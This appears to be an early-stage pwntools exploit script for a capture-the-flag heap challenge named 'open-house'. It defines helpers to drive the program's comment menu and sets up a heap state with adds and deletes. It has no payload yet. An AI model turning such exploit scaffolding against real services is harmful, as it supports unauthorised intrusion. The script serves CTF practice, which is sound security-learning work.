#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("open-house")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./open-house")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./open-house', checksec=False)

def add_cmt(data):
    p.sendlineafter(b'q>', b'c')
    p.sendlineafter(b'review!', data)

def view_cmt():
    p.sendlineafter(b'q>', b'v')

def replace_cmt(idx, data):
    p.sendlineafter(b'q>', b'm')
    p.sendlineafter(b'replace?', str(idx))
    p.sendafter(b'it with?', data)

def delete_cmt(idx):
    p.sendlineafter(b'q>', b'd')
    p.sendlineafter(b'delete?', str(idx))

def leave():
     p.sendlineafter(b'q>', b'q')




for i in range(6):
    add_cmt(str(i)*100)

delete_cmt(1)
delete_cmt(2)

p.interactive()